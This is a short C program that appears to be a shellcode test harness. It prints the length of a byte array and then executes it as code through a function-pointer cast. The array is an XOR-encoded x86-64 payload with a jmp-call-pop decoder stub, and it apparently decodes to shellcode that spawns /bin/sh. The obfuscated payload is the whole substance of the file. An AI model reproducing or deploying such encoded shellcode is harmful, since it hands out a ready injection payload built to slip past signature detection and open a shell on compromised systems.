#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x11\x5f\x48\x31\xc9\x80\xc1\x3c\x80\x37\xaa\x48\xff\xc7\xe2\xf8\xeb\x05\xe8\xea\xff\xff\xff\x41\xb7\xe2\x9b\x6a\xf5\x22\xcd\xad\xe2\x23\xd5\xa2\xe2\x23\xed\xba\xe2\x27\xdd\xa2\xe2\x27\xfd\xba\xe2\x29\x6a\x91\xa5\xaf\x42\x74\x55\x55\x55\x85\xc8\xc3\xc4\x85\xd9\xc2\xeb\xe8\xe8\xe8\xe8\xe8\xe8\xe8\xe8\xe9\xe9\xe9\xe9\xe9\xe9\xe9\xe9";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
